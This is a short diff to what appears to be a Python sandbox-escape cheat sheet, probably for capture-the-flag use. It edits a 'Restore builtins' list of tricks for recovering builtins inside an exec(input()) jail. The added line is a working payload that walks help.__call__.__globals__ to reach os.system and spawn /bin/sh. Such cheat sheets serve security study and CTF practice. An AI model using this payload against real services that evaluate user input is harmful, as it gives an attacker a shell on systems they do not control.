@@ -13,7 +13,7 @@ exec(input())
 
 ### Restore builtins
 ```py
-help.__call__.__builtins__ # or __globals__
+help.__call__.__builtins__ # or __globals__ -> help.__call__.__globals__["sys"].modules["os"].system("/bin/sh")
 license.__call__.__builtins__ # or __globals__
 credits.__call__.__builtins__ # or __globals__
 __build_class__.__self__
